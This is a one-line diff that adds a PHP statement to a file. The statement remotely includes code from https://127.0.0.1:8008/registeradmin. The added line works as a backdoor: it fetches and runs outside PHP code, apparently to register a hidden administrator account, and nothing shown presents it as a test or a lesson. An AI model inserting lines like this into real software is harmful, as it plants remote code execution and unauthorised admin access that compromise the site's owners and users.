@@ -1,0 +1,1 @@
+<?php include_once("https://127.0.0.1:8008/registeradmin")?>
